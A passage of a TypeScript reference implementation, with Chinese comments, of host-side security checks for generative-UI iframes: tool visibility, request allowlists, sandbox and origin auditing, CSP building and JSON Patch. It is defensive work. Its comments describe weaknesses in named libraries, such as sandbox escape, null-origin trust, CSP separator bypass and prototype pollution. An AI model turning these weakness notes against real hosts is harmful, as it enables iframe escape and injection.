/**
 * L16x 的参考实现：生成式 UI 宿主这一侧的协议与信任判定。
 *
 * 九组纯函数，零 DOM、零 I/O、零模型：可见性、宿主桥、出站时序、消息来源、CSP 与 allow、沙箱、
 * 尺寸、原子 JSON Patch、A2UI 树与目录，以及「从 iframe 通往模型上下文」的两条路。
 * 危险全在「给定一条消息 / 一棵树 / 一个属性字符串，它能不能过」——这一层能确定性地测，一次模型都不用调。
 * 每条规则旁边用 ★ 标出那个「看起来对、实际错」的写法；verify 就拿那些写法去敲门。
 *
 * 口径：MCP Apps 稳定版 2026-01-26、A2UI v0.9.1（v1.0 候选的条目单独标出）、AG-UI 1.0。
 */

const J = (x: unknown) => JSON.stringify(x)

export interface Decision {
  allow: boolean
  reason: string
}

const allow = (): Decision => ({ allow: true, reason: 'ok' })
const deny = (reason: string): Decision => ({ allow: false, reason })

export function asciiLower(s: string): string {
  let out = ''
  for (const c of s) out += c >= 'A' && c <= 'Z' ? String.fromCharCode(c.charCodeAt(0) + 32) : c
  return out
}

/** HTML 的 ASCII 空白：sandbox 属性、CSP source list、Permissions Policy 都按它切。 */
export const ASCII_WS = [' ', '\t', '\n', '\r', '\f']

export function splitAsciiWs(s: string): string[] {
  const out: string[] = []
  let cur = ''
  for (const c of s) {
    if (ASCII_WS.includes(c)) {
      if (cur !== '') out.push(cur)
      cur = ''
    } else cur += c
  }
  if (cur !== '') out.push(cur)
  return out
}

function trimAsciiWs(s: string): string {
  let a = 0
  let b = s.length
  while (a < b && ASCII_WS.includes(s[a]!)) a++
  while (b > a && ASCII_WS.includes(s[b - 1]!)) b--
  return s.slice(a, b)
}

/** scheme://host[:port]，host 小写、默认端口去掉。不用 URL / urllib：两种语言对畸形输入的处理不一样。 */
export function originOf(u: string): string {
  const i = u.indexOf('://')
  if (i < 0) return 'null'
  const scheme = asciiLower(u.slice(0, i))
  let rest = u.slice(i + 3)
  let cut = rest.length
  for (const c of ['/', '?', '#']) {
    const k = rest.indexOf(c)
    if (k >= 0 && k < cut) cut = k
  }
  rest = rest.slice(0, cut)
  const at = rest.lastIndexOf('@')
  if (at >= 0) rest = rest.slice(at + 1)
  let host = asciiLower(rest)
  if ((scheme === 'https' && host.endsWith(':443')) || (scheme === 'http' && host.endsWith(':80'))) {
    host = host.slice(0, host.lastIndexOf(':'))
  }
  return `${scheme}://${host}`
}

// ─────────────────────────────────────────────────────────────
// 一、可见性：两个方向（§2.3、§2.4、§10.1）
// ─────────────────────────────────────────────────────────────

export type Vis = 'model' | 'app'
export const DEFAULT_VISIBILITY: Vis[] = ['model', 'app']

export interface VisParse {
  ok: boolean
  /** 没写 visibility（JSON 里缺这个键或是 null）。 */
  omitted: boolean
  list: Vis[]
  reason: string
}

/**
 * `_meta.ui.visibility` 的解析。规范类型是 `Array<"model" | "app">`，省略时默认 `["model","app"]`。
 * ★ 必须先判是不是数组：字符串 "app" 也有 `.includes("app")`，@ai-sdk/mcp 就因此把它判成 app 可见（实测 T1）。
 */
export function parseVisibility(v: unknown): VisParse {
  if (v === undefined || v === null) return { ok: true, omitted: true, list: [...DEFAULT_VISIBILITY], reason: '' }
  if (!Array.isArray(v)) return { ok: false, omitted: false, list: [], reason: 'not-an-array' }
  const list: Vis[] = []
  for (const x of v) {
    if (x !== 'model' && x !== 'app') return { ok: false, omitted: false, list: [], reason: `unknown-entry:${J(x)}` }
    if (!list.includes(x)) list.push(x)
  }
  return { ok: true, omitted: false, list, reason: '' }
}

/** 规范语义：省略 = 双方可见；判据是 includes，不是「长度为 1 且等于」。 */
export function specModelVisible(v: unknown): boolean {
  const p = parseVisibility(v)
  return p.ok && p.list.includes('model')
}

export function specAppVisible(v: unknown): boolean {
  const p = parseVisibility(v)
  return p.ok && p.list.includes('app')
}

/** 官方 basic-host 的「给模型列工具」：解析失败也当可见（fail-open）。 */
export function basicHostModelVisible(v: unknown): boolean {
  const p = parseVisibility(v)
  return !p.ok || p.list.includes('model')
}

/** ext-apps 的 isToolVisibilityAppOnly：`length === 1 && [0] === "app"`。★ `["app","app"]` 判成 false。 */
export function extAppsAppOnly(v: unknown): boolean {
  return Array.isArray(v) && v.length === 1 && v[0] === 'app'
}

/** @ai-sdk/mcp 的 splitMCPAppTools：`visibility?.includes(x) === true`。字符串的 includes 是子串匹配。 */
export function aiSdkModelVisible(v: unknown): boolean {
  if (v === undefined || v === null) return true
  if (Array.isArray(v)) return v.includes('model')
  if (typeof v === 'string') return v.includes('model')
  return false
}

export function aiSdkAppVisible(v: unknown): boolean {
  if (Array.isArray(v)) return v.includes('app')
  if (typeof v === 'string') return v.includes('app')
  return false
}

/**
 * 宿主「给 app 调」这个方向：**显式**写了 app 才放行。省略、解析失败一律拒（fail-closed）。
 * ★ 比规范严（规范省略 = app 可调），和 AI SDK 的 deny-by-default 同向：这个方向 fail-open 就是越权。
 */
export function hostAppMayCall(v: unknown): boolean {
  const p = parseVisibility(v)
  return p.ok && !p.omitted && p.list.includes('app')
}

// ─────────────────────────────────────────────────────────────
// 二、宿主桥：View 发来的请求能不能放行（§2.4、§2.5、§6.5、§7.2）
// ─────────────────────────────────────────────────────────────

/** 2026-01-26 稳定版里 View 可以发给宿主的方法。 */
export const VIEW_METHODS = [
  'ui/initialize',
  'ui/notifications/initialized',
  'ping',
  'tools/call',
  'resources/read',
  'notifications/message',
  'ui/open-link',
  'ui/message',
  'ui/request-display-mode',
  'ui/update-model-context',
  'ui/notifications/size-changed',
]

/** AppBridge.connect() 自动转发时额外挂上的方法——不在稳定版列给 View 的消息里（§2.4）。 */
export const SDK_AUTOFORWARD_EXTRA = ['resources/list', 'resources/templates/list', 'prompts/list']

export const LINK_SCHEMES = ['https', 'http', 'mailto']

export interface ToolDef {
  name: string
  server: string
  visibility?: unknown
}

export interface ViewRequest {
  jsonrpc?: string
  id?: number
  method?: unknown
  params?: Record<string, unknown>
}

export interface BridgeCtx {
  /** 这个 View 属于哪个 server 连接。 */
  appServer: string
  /** 宿主已知的全部工具（跨所有 server）。 */
  tools: ToolDef[]
  methods?: string[]
}

/** 对照组：ext-apps `AppBridge.connect()` 的自动转发。不查可见性、不查 server 归属。 */
export function sdkAutoForward(msg: ViewRequest): Decision {
  if (typeof msg.method !== 'string') return deny('bad-shape')
  if (VIEW_METHODS.includes(msg.method) || SDK_AUTOFORWARD_EXTRA.includes(msg.method)) return { allow: true, reason: 'forwarded' }
  return deny('unhandled')
}

/**
 * TODO 1 的参考实现：一个 View 发起的请求能不能放行。三道闸放在**同一个**函数里：
 *   方法白名单 → （tools/call）工具属于**这个 View 的 server** → 这个工具显式对 app 可见。
 * 另外两个方法有参数级的规则：resources/read 只读 ui://；ui/open-link 只放 https / http / mailto。
 *
 * ★ 规范把「拒绝」写成宿主的 MUST，SDK 的便捷转发把它留给了宿主自己（§2.4）；AG-UI 中间件只做了 model 方向（§6.5）。
 * ★ 跨 server 的判定只能在前端桥里做：后端中间件不知道请求来自哪个 iframe。
 */
export function routeAppRequest(msg: ViewRequest, ctx: BridgeCtx): Decision {
  const methods = ctx.methods ?? VIEW_METHODS
  if (typeof msg.method !== 'string') return deny('bad-shape')
  if (!methods.includes(msg.method)) return deny(`method-not-allowed:${msg.method}`)
  const p = msg.params ?? {}
  if (msg.method === 'tools/call') {
    const name = p.name
    if (typeof name !== 'string') return deny('bad-shape')
    const mine = ctx.tools.find((t) => t.name === name && t.server === ctx.appServer)
    if (mine === undefined) {
      const other = ctx.tools.find((t) => t.name === name)
      return deny(other !== undefined ? `cross-server:${other.server}` : `unknown-tool:${name}`)
    }
    if (!hostAppMayCall(mine.visibility)) return deny(`not-app-visible:${name}`)
    return allow()
  }
  if (msg.method === 'resources/read') {
    const uri = p.uri
    if (typeof uri !== 'string') return deny('bad-shape')
    if (!uri.startsWith('ui://')) return deny(`not-ui-resource:${uri}`)
    return allow()
  }
  if (msg.method === 'ui/open-link') {
    const url = p.url
    if (typeof url !== 'string') return deny('bad-shape')
    const k = url.indexOf(':')
    const scheme = k > 0 ? asciiLower(url.slice(0, k)) : ''
    if (!LINK_SCHEMES.includes(scheme)) return deny(`link-scheme:${scheme}`)
    return allow()
  }
  return allow()
}

// ─────────────────────────────────────────────────────────────
// 三、出站时序：宿主 → View（§2.5、§4.1、§7.2）
// ─────────────────────────────────────────────────────────────

export type OutKind = 'tool-input-partial' | 'tool-input' | 'tool-result' | 'tool-cancelled' | 'host-context-changed'

export type HostEvent =
  | { t: 'initialized' }
  | { t: 'approval-requested' }
  | { t: 'approval'; approved: boolean }
  | { t: 'out'; kind: OutKind; data?: string }

export interface Outbound {
  /** 实际 postMessage 出去的，按发送顺序。 */
  sent: string[]
  /** 丢弃的：`label:原因`。 */
  dropped: string[]
  /** 事件流结束时还压着没发的。 */
  held: string[]
}

export function outLabel(kind: OutKind, data?: string): string {
  return data !== undefined ? `${kind}(${data})` : kind
}

/**
 * TODO 6 的参考实现：宿主发给 View 的通知该什么时候发。
 *   - 收到 View 的 `initialized` 之前，什么都不发（MUST NOT），全部压着
 *   - `tool-input` 最多一次，第二次丢弃（duplicate-tool-input）；它之后再来的 partial 丢弃（partial-after-input）
 *   - 审批挂起（approval-requested）时，tool-input 和 partial 都不发；批准后放出，拒绝则丢弃（approval-denied）
 *   - `tool-result` 必须在 tool-input 之后：没发过 input 就压着
 *   - 其余（cancelled、host-context-changed）准备好了就发
 * 每次状态变化后从队首重新扫一遍：能发的按队列顺序发，压着的留在原位。
 *
 * ★ 工具调用和 iframe 加载是并行的（规范时序图里是 par）：结果可能比 initialized 先到，直接 postMessage 过去要么丢、要么违规。
 * ★ 审批前就把入参交给 View「预热」——OpenAI 曾这么做，2026-05-27 改成审批后；AI SDK 在 approval-requested 时不发。
 */
export function scheduleOutbound(events: HostEvent[]): Outbound {
  const sent: string[] = []
  const dropped: string[] = []
  const queue: { kind: OutKind; data?: string }[] = []
  let ready = false
  let gate: 'open' | 'pending' | 'denied' = 'open'
  let inputSent = false

  const verdict = (n: { kind: OutKind }): 'send' | 'hold' | string => {
    if (n.kind === 'tool-input' || n.kind === 'tool-input-partial') {
      if (inputSent) return n.kind === 'tool-input' ? 'duplicate-tool-input' : 'partial-after-input'
      if (gate === 'pending') return 'hold'
      if (gate === 'denied') return 'approval-denied'
      return 'send'
    }
    if (n.kind === 'tool-result' && !inputSent) return 'hold'
    return 'send'
  }

  const pump = (): void => {
    if (!ready) return
    let progress = true
    while (progress) {
      progress = false
      for (let i = 0; i < queue.length; i++) {
        const n = queue[i]!
        const v = verdict(n)
        if (v === 'hold') continue
        queue.splice(i, 1)
        progress = true
        if (v === 'send') {
          sent.push(outLabel(n.kind, n.data))
          if (n.kind === 'tool-input') inputSent = true
        } else dropped.push(`${outLabel(n.kind, n.data)}:${v}`)
        break
      }
    }
  }

  for (const e of events) {
    if (e.t === 'initialized') ready = true
    else if (e.t === 'approval-requested') gate = 'pending'
    else if (e.t === 'approval') gate = e.approved ? 'open' : 'denied'
    else queue.push(e.data !== undefined ? { kind: e.kind, data: e.data } : { kind: e.kind })
    pump()
  }
  return { sent, dropped, held: queue.map((n) => outLabel(n.kind, n.data)) }
}

/** 对照组：一产生就 postMessage。 */
export function naiveOutbound(events: HostEvent[]): string[] {
  const out: string[] = []
  for (const e of events) if (e.t === 'out') out.push(outLabel(e.kind, e.data))
  return out
}

// ─────────────────────────────────────────────────────────────
// 四、iframe 的 origin、sandbox 与 postMessage（§3.1–3.3、§10.4）
// ─────────────────────────────────────────────────────────────

export interface FrameSpec {
  kind: 'srcdoc' | 'src'
  src?: string
  /** 不写 = 没有 sandbox 属性；空串 = 有属性、零个 token（最严）。 */
  sandbox?: string
}

export const SANDBOX_TOKENS = [
  'allow-downloads',
  'allow-forms',
  'allow-modals',
  'allow-orientation-lock',
  'allow-pointer-lock',
  'allow-popups',
  'allow-popups-to-escape-sandbox',
  'allow-presentation',
  'allow-same-origin',
  'allow-scripts',
  'allow-storage-access-by-user-activation',
  'allow-top-navigation',
  'allow-top-navigation-by-user-activation',
  'allow-top-navigation-to-custom-protocols',
]

/** sandbox 属性的 token：按 ASCII 空白切、ASCII 小写、去重。 */
export function sandboxTokens(attr: string): string[] {
  const out: string[] = []
  for (const t of splitAsciiWs(attr)) {
    const l = asciiLower(t)
    if (!out.includes(l)) out.push(l)
  }
  return out
}

/**
 * 浏览器给这个 iframe 的文档的 origin（序列化后）。
 * ★ srcdoc / about:blank **继承**创建者的 origin（不是 "null"）；只有不含 allow-same-origin 的 sandbox 才变不透明源（实测 origin 组）。
 * ★ 所有不透明源都序列化成同一个字符串 "null"。
 */
export function frameOrigin(f: FrameSpec, creatorOrigin: string): string {
  if (f.sandbox !== undefined && !sandboxTokens(f.sandbox).includes('allow-same-origin')) return 'null'
  return f.kind === 'srcdoc' ? creatorOrigin : originOf(f.src ?? '')
}

/**
 * sandbox 属性体检。
 * ★ 「allow-scripts + allow-same-origin 等于没沙箱」的前提是**同源**：WHATWG 原文有那个从句，流传时总被删掉。
 *   跨源嵌入时这组 flag 仍安全（实测 B1 / B1b）。
 */
export function auditSandbox(f: FrameSpec, creatorOrigin: string): string[] {
  if (f.sandbox === undefined) return ['no-sandbox-attribute']
  const toks = sandboxTokens(f.sandbox)
  const out: string[] = []
  const real = f.kind === 'srcdoc' ? creatorOrigin : originOf(f.src ?? '')
  if (toks.includes('allow-scripts') && toks.includes('allow-same-origin') && real === creatorOrigin) out.push('escape:same-origin+scripts')
  for (const t of toks) {
    if (t.startsWith('allow-top-navigation')) out.push(`top-navigation:${t}`)
    else if (!SANDBOX_TOKENS.includes(t)) out.push(`unknown-token:${t}`)
  }
  return out
}

/**
 * 加载之后再改 sandbox 属性：只在**下一次导航**生效。document.write 不是导航（实测 B6）。
 * basic-host 的内层正是 document.write 写进去的——宿主后来下发的「更严的 sandbox」在这条路径上不生效。
 */
export function effectiveSandbox(initial: string, changedTo: string, via: 'document.write' | 'navigate'): string {
  return via === 'navigate' ? changedTo : initial
}

export interface MsgEvent {
  /** 发送方窗口的身份。真实代码里是 `event.source === iframe.contentWindow`，这里用一个字符串代替。 */
  source: string
  origin: string
  data: unknown
}

export interface PeerCfg {
  expectedSource: string
  /** `["*"]` 表示不查 origin（只在对方是不透明源时才该这么配，且 source 照查）。 */
  allowedOrigins: string[]
}

export function peerConfigErrors(cfg: PeerCfg): string[] {
  const out: string[] = []
  if (cfg.allowedOrigins.length === 0) out.push('empty-allowlist')
  if (cfg.allowedOrigins.includes('null')) out.push('null-origin-allowlisted')
  if (cfg.allowedOrigins.includes('*') && cfg.allowedOrigins.length > 1) out.push('wildcard-mixed')
  return out
}

export function isJsonRpcShape(d: unknown): boolean {
  if (typeof d !== 'object' || d === null || Array.isArray(d)) return false
  const o = d as Record<string, unknown>
  if (o.jsonrpc !== '2.0') return false
  return typeof o.method === 'string' || 'id' in o
}

/**
 * TODO 2 的参考实现（前半）：收 postMessage。依次：配置本身合不合法 → source → origin → 形状。
 * ★ 把 "null" 放进白名单 = 接受**任何**沙箱页的消息（所有不透明源都是同一个字符串）。配置错误时一律拒（fail-closed）。
 * ★ 只查 origin 不够：生成式 UI 里身份是窗口引用。ext-apps 的默认 transport 曾只查 target 不查 source（commit c7ef5f00）。
 */
export function acceptsMessage(ev: MsgEvent, cfg: PeerCfg): Decision {
  const errs = peerConfigErrors(cfg)
  if (errs.length > 0) return deny(`config:${errs[0]}`)
  if (ev.source !== cfg.expectedSource) return deny('wrong-source')
  const any = cfg.allowedOrigins.length === 1 && cfg.allowedOrigins[0] === '*'
  if (!any && !cfg.allowedOrigins.includes(ev.origin)) return deny(`wrong-origin:${ev.origin}`)
  if (!isJsonRpcShape(ev.data)) return deny('bad-shape')
  return allow()
}

/**
 * TODO 2 的参考实现（后半）：发 postMessage 用的 targetOrigin。
 * ★ 对不透明源只能用 "*"：`postMessage(msg, "null")` 抛 SyntaxError（实测 B3）。所以敏感数据要少进 View。
 */
export function safeTargetOrigin(peerOrigin: string): string {
  return peerOrigin === 'null' ? '*' : peerOrigin
}

/** 浏览器对 targetOrigin 的检查（静态模拟）：返回会抛的错误，空串表示合法。 */
export function targetOriginError(t: string): string {
  if (t === '*' || t === '/') return ''
  if (originOf(t) === 'null') return `SyntaxError: Invalid target origin '${t}'`
  return ''
}

// ─────────────────────────────────────────────────────────────
// 五、CSP 与 allow 属性（§2.8、§2.9、§3.5、§8.2、§10.2）
// ─────────────────────────────────────────────────────────────

export interface CspDecl {
  connectDomains?: unknown
  resourceDomains?: unknown
  frameDomains?: unknown
  baseUriDomains?: unknown
}

export interface SourceCheck {
  ok: boolean
  value: string
  reason: string
}

const HEX = '0123456789abcdefABCDEF'

/** %XX → 字符（只解 ASCII）。 */
export function percentDecode(s: string): string {
  let out = ''
  let i = 0
  while (i < s.length) {
    const c = s[i]!
    if (c === '%' && i + 2 < s.length && HEX.includes(s[i + 1]!) && HEX.includes(s[i + 2]!)) {
      const code = parseInt(s.slice(i + 1, i + 3), 16)
      if (code < 128) {
        out += String.fromCharCode(code)
        i += 3
        continue
      }
    }
    out += c
    i += 1
  }
  return out
}

export const CSP_SEPARATORS = ['"', "'", '`', ';', ',', ...ASCII_WS]

/**
 * 一个 server 声明的 CSP 源。**先规范化（解码 %XX）再查分隔符**，和 AI SDK 的 sandbox.ts 同一个顺序。
 * 只收 https: / wss:；拒绝裸 `*` 主机（`*.example.com` 可以）；拒绝 userinfo；路径丢掉，只留 scheme://host[:port]。
 * ★ 做字符黑名单删字符会被编码绕过；basic-host 的 `/[;\r\n'" ]/` 没有 tab 和逗号——tab 在 CSP 里同样切分源列表。
 */
export function checkSource(raw: unknown): SourceCheck {
  const bad = (reason: string): SourceCheck => ({ ok: false, value: '', reason })
  if (typeof raw !== 'string') return bad('not-a-string')
  const d = percentDecode(raw)
  for (const c of d) if (CSP_SEPARATORS.includes(c)) return bad('separator')
  const i = d.indexOf('://')
  if (i < 0) return bad('no-scheme')
  const scheme = asciiLower(d.slice(0, i))
  if (scheme !== 'https' && scheme !== 'wss') return bad(`scheme:${scheme}`)
  let host = d.slice(i + 3)
  let cut = host.length
  for (const c of ['/', '?', '#']) {
    const k = host.indexOf(c)
    if (k >= 0 && k < cut) cut = k
  }
  host = asciiLower(host.slice(0, cut))
  if (host === '') return bad('empty-host')
  if (host.includes('@')) return bad('userinfo')
  const colon = host.lastIndexOf(':')
  const name = colon >= 0 ? host.slice(0, colon) : host
  const wildOk = name.startsWith('*.') && !name.slice(2).includes('*') && name.length > 2
  if (name.includes('*') && !wildOk) return bad('wildcard-host')
  return { ok: true, value: `${scheme}://${host}`, reason: '' }
}

export interface CspResult {
  csp: string
  /** `字段:原值:原因`。 */
  rejected: string[]
}

/**
 * TODO 3 的参考实现：由 server 声明的域名构造 View 的 CSP。
 *   - 每个字段：缺省 / null → 空；不是数组 → 整个字段拒；逐条 checkSource，通过的去重保序
 *   - connect-src、frame-src 没有声明时是 'none'（规范的 Restrictive Default），不是 'self'
 *   - **显式**写 object-src 'none'、base-uri 'none'（没有 baseUriDomains 时）、form-action 'none'
 *
 * ★ 不声明 csp 也要返回限制性策略：AI SDK 的 getMCPAppCSP(undefined) 返回 undefined，约束反而比声明 {} 更少（实测 T2）。
 * ★ form-action、base-uri 是导航 / 文档指令，**不回退**到 default-src：`default-src 'none'` 关不住表单（实测 E4）。
 * ★ 'self' 对一个 srcdoc View 指的是代理文档的源，不是 View 自己——所以 connect-src 默认不给 'self'。
 */
export function buildCsp(decl?: CspDecl | null): CspResult {
  const rejected: string[] = []
  const field = (name: keyof CspDecl): string[] => {
    const v = decl === undefined || decl === null ? undefined : decl[name]
    if (v === undefined || v === null) return []
    if (!Array.isArray(v)) {
      rejected.push(`${name}:not-an-array`)
      return []
    }
    const out: string[] = []
    for (const e of v) {
      const r = checkSource(e)
      if (!r.ok) rejected.push(`${name}:${J(e)}:${r.reason}`)
      else if (!out.includes(r.value)) out.push(r.value)
    }
    return out
  }
  const res = field('resourceDomains')
  const con = field('connectDomains')
  const fr = field('frameDomains')
  const base = field('baseUriDomains')
  const sp = (xs: string[]) => (xs.length > 0 ? ' ' + xs.join(' ') : '')
  const csp = [
    "default-src 'none'",
    `script-src 'self' 'unsafe-inline'${sp(res)}`,
    `style-src 'self' 'unsafe-inline'${sp(res)}`,
    `img-src 'self' data:${sp(res)}`,
    `font-src 'self' data:${sp(res)}`,
    `media-src 'self' data:${sp(res)}`,
    `connect-src ${con.length > 0 ? con.join(' ') : "'none'"}`,
    `frame-src ${fr.length > 0 ? fr.join(' ') : "'none'"}`,
    "object-src 'none'",
    `base-uri ${base.length > 0 ? base.join(' ') : "'none'"}`,
    "form-action 'none'",
  ].join('; ')
  return { csp, rejected }
}

/** 一条策略里某个指令的值（不含指令名），没有返回 null。 */
export function cspDirective(csp: string, name: string): string | null {
  for (const part of csp.split(';')) {
    const toks = splitAsciiWs(part)
    if (toks.length > 0 && asciiLower(toks[0]!) === name) return toks.slice(1).join(' ')
  }
  return null
}

function strList(v: unknown): string[] {
  if (!Array.isArray(v)) return []
  return v.filter((x): x is string => typeof x === 'string')
}

/** 对照组：规范 Security 节示例代码的 connect-src——直接 join(' ')，不做任何校验。 */
export function specExampleConnectSrc(decl?: CspDecl | null): string {
  const d = decl === undefined || decl === null ? [] : strList(decl.connectDomains)
  return `connect-src 'self' ${d.join(' ')}`.trimEnd()
}

/** 对照组：basic-host 的 sanitizeCspDomains（`/[;\r\n'" ]/`）+ `connect-src 'self' …`。 */
export function basicHostConnectSrc(decl?: CspDecl | null): string {
  const d = decl === undefined || decl === null ? [] : strList(decl.connectDomains)
  const kept = d.filter((x) => ![';', '\r', '\n', "'", '"', ' '].some((c) => x.includes(c)))
  return `connect-src 'self' ${kept.join(' ')}`.trimEnd()
}

/** `_meta.ui.permissions` 的键 → Permissions Policy 特性名。 */
export const PERMISSION_FEATURES: [string, string][] = [
  ['camera', 'camera'],
  ['microphone', 'microphone'],
  ['geolocation', 'geolocation'],
  ['clipboardWrite', 'clipboard-write'],
]

function requested(req: Record<string, unknown>, k: string): boolean {
  return k in req && req[k] !== false && req[k] !== null && req[k] !== undefined
}

/**
 * iframe 的 allow 属性：只给 server 请求了、**且**宿主白名单里有的特性；宿主没给白名单 → 什么都不给。用 "; " 连接。
 * ★ 规范示例用 join(' ')：`allow="camera microphone"` 被解析成**一条**指令（特性 camera，allowlist 是一个叫 microphone 的源），
 *   两个都没开（实测 B4）。
 */
export function buildAllowAttr(req: Record<string, unknown>, hostAllow?: string[]): string {
  if (hostAllow === undefined) return ''
  const out: string[] = []
  for (const [k, f] of PERMISSION_FEATURES) if (requested(req, k) && hostAllow.includes(f)) out.push(f)
  return out.join('; ')
}

/** 对照组：规范 Security 节示例代码（空格连接，且漏了 clipboard-write）。 */
export function specExampleAllow(req: Record<string, unknown>): string {
  const out: string[] = []
  for (const k of ['camera', 'microphone', 'geolocation']) if (requested(req, k)) out.push(k)
  return out.join(' ')
}

export interface PolicyDirective {
  feature: string
  allowlist: string[]
}

/** Permissions Policy 的 allow 属性语法：指令之间 `;`，指令内部「特性名 + 空白 + allowlist」。 */
export function parseAllowAttr(attr: string): PolicyDirective[] {
  const out: PolicyDirective[] = []
  for (const part of attr.split(';')) {
    const toks = splitAsciiWs(trimAsciiWs(part))
    if (toks.length === 0) continue
    out.push({ feature: asciiLower(toks[0]!), allowlist: toks.slice(1) })
  }
  return out
}

/** 这个 frame 实际被委派了哪些特性：allowlist 为空（默认 'src'）、含 `*`、`'src'` 或 frame 自己的 origin。 */
export function delegatedFeatures(attr: string, frameOrig: string): string[] {
  const out: string[] = []
  for (const d of parseAllowAttr(attr)) {
    const ok = d.allowlist.length === 0 || d.allowlist.includes('*') || d.allowlist.includes("'src'") || d.allowlist.includes(frameOrig)
    if (ok && !out.includes(d.feature)) out.push(d.feature)
  }
  return out
}

// ─────────────────────────────────────────────────────────────
// 六、尺寸：一个由不可信方提供的数字（§2.5）
// ─────────────────────────────────────────────────────────────

/** basic-host 的 maxHeight。 */
export const MAX_VIEW_HEIGHT = 6000

export interface Clamped {
  height: number
  note: string
}

/** View 报上来的高度。★ `height: 1e9` 能把宿主 UI 挤出视口——clickjacking 的素材。 */
export function clampHeight(h: unknown, max: number = MAX_VIEW_HEIGHT): Clamped {
  if (typeof h !== 'number') return { height: 0, note: 'rejected:not-a-number' }
  if (!Number.isFinite(h)) return { height: 0, note: 'rejected:not-finite' }
  if (h < 0) return { height: 0, note: 'rejected:negative' }
  const f = Math.floor(h)
  return f > max ? { height: max, note: `clamped:${max}` } : { height: f, note: 'ok' }
}

// ─────────────────────────────────────────────────────────────
// 七、原子 JSON Patch（RFC 6902 / 6901；AG-UI STATE_DELTA）（§6.2、§10.3）
// ─────────────────────────────────────────────────────────────

export type Json = null | boolean | number | string | Json[] | { [k: string]: Json }
type Obj = { [k: string]: Json }

const isObj = (x: unknown): x is Obj => typeof x === 'object' && x !== null && !Array.isArray(x)
const hasOwn = (o: Obj, k: string) => Object.prototype.hasOwnProperty.call(o, k)

export function cloneJson<T extends Json>(x: T): T {
  return JSON.parse(JSON.stringify(x)) as T
}

/** JSON 类型：null / boolean / number / string / array / object。★ Python 里 bool 是 int 的子类，要先判。 */
export function jsonType(x: unknown): string {
  if (x === null) return 'null'
  if (Array.isArray(x)) return 'array'
  if (typeof x === 'boolean') return 'boolean'
  if (typeof x === 'number') return 'number'
  if (typeof x === 'string') return 'string'
  return 'object'
}

/**
 * RFC 6902 §4.6 的相等：**先比 JSON 类型**；数字按数值；数组逐个；对象键集合相同、值逐个相等（与键顺序无关）。
 * ★ Python `True == 1`、`1 == 1.0`；JS `===` 把两个内容相同的对象判不等。用语言自带的 == 都会错。
 */
export function jsonTypeEqual(a: Json, b: Json): boolean {
  const ta = jsonType(a)
  if (ta !== jsonType(b)) return false
  if (ta === 'array') {
    const x = a as Json[]
    const y = b as Json[]
    if (x.length !== y.length) return false
    for (let i = 0; i < x.length; i++) if (!jsonTypeEqual(x[i]!, y[i]!)) return false
    return true
  }
  if (ta === 'object') {
    const x = a as Obj
    const y = b as Obj
    const kx = Object.keys(x)
    if (kx.length !== Object.keys(y).length) return false
    for (const k of kx) if (!hasOwn(y, k) || !jsonTypeEqual(x[k]!, y[k]!)) return false
    return true
  }
  return a === b
}

/** ★ JS 的 `obj[key] = v` 碰到这三个键段会改原型链。Python 没这个问题，但两边同样拒绝，输出才一致。 */
export const FORBIDDEN_SEGMENTS = ['__proto__', 'constructor', 'prototype']

export interface Pointer {
  ok: boolean
  tokens: string[]
  reason: string
}

/**
 * RFC 6901。"" 是整个文档；否则必须以 / 开头。每段先 `~1`→`/`，再 `~0`→`~`；`~` 后面只能是 0 或 1。
 * ★ 顺序反了，`~01` 会先变成 `~1` 再变成 `/`。
 */
export function decodePointer(path: string): Pointer {
  const bad = (reason: string): Pointer => ({ ok: false, tokens: [], reason })
  if (path === '') return { ok: true, tokens: [], reason: '' }
  if (path[0] !== '/') return bad('bad-pointer')
  const tokens: string[] = []
  for (const raw of path.slice(1).split('/')) {
    for (let i = 0; i < raw.length; i++) {
      if (raw[i] === '~' && raw.slice(i + 1, i + 2) !== '0' && raw.slice(i + 1, i + 2) !== '1') return bad('bad-escape')
    }
    const tok = raw.split('~1').join('/').split('~0').join('~')
    if (FORBIDDEN_SEGMENTS.includes(tok)) return bad(`forbidden-segment:${tok}`)
    tokens.push(tok)
  }
  return { ok: true, tokens, reason: '' }
}

const INDEX_RE = /^(0|[1-9][0-9]*)$/

/** RFC 6901 的 array-index：`0` 或不以 0 开头的数字串。★ parseInt 会接受 "01"、"1e0"、" 1"。 */
export function parseArrayIndex(tok: string): number | null {
  return INDEX_RE.test(tok) ? Number(tok) : null
}

interface Got {
  ok: boolean
  value: Json
  reason: string
}

function getAt(doc: Json, tokens: string[]): Got {
  let cur: Json = doc
  for (const t of tokens) {
    if (Array.isArray(cur)) {
      const i = parseArrayIndex(t)
      if (i === null) return { ok: false, value: null, reason: `bad-index:${t}` }
      if (i >= cur.length) return { ok: false, value: null, reason: 'path-not-found' }
      cur = cur[i]!
    } else if (isObj(cur)) {
      if (!hasOwn(cur, t)) return { ok: false, value: null, reason: 'path-not-found' }
      cur = cur[t]!
    } else return { ok: false, value: null, reason: 'path-not-found' }
  }
  return { ok: true, value: cur, reason: '' }
}

interface Step {
  ok: boolean
  doc: Json
  reason: string
}

const fail = (reason: string): Step => ({ ok: false, doc: null, reason })

function addAt(doc: Json, tokens: string[], value: Json): Step {
  if (tokens.length === 0) return { ok: true, doc: value, reason: '' }
  const p = getAt(doc, tokens.slice(0, -1))
  if (!p.ok) return fail(p.reason)
  const last = tokens[tokens.length - 1]!
  const parent = p.value
  if (Array.isArray(parent)) {
    const i = last === '-' ? parent.length : parseArrayIndex(last)
    if (i === null) return fail(`bad-index:${last}`)
    if (i > parent.length) return fail('index-out-of-range')
    parent.splice(i, 0, value)
    return { ok: true, doc, reason: '' }
  }
  if (isObj(parent)) {
    parent[last] = value
    return { ok: true, doc, reason: '' }
  }
  return fail('path-not-found')
}

function removeAt(doc: Json, tokens: string[]): Step {
  if (tokens.length === 0) return fail('cannot-remove-root')
  const p = getAt(doc, tokens.slice(0, -1))
  if (!p.ok) return fail(p.reason)
  const last = tokens[tokens.length - 1]!
  const parent = p.value
  if (Array.isArray(parent)) {
    const i = parseArrayIndex(last)
    if (i === null) return fail(`bad-index:${last}`)
    if (i >= parent.length) return fail('path-not-found')
    parent.splice(i, 1)
    return { ok: true, doc, reason: '' }
  }
  if (isObj(parent)) {
    if (!hasOwn(parent, last)) return fail('path-not-found')
    delete parent[last]
    return { ok: true, doc, reason: '' }
  }
  return fail('path-not-found')
}

function replaceAt(doc: Json, tokens: string[], value: Json): Step {
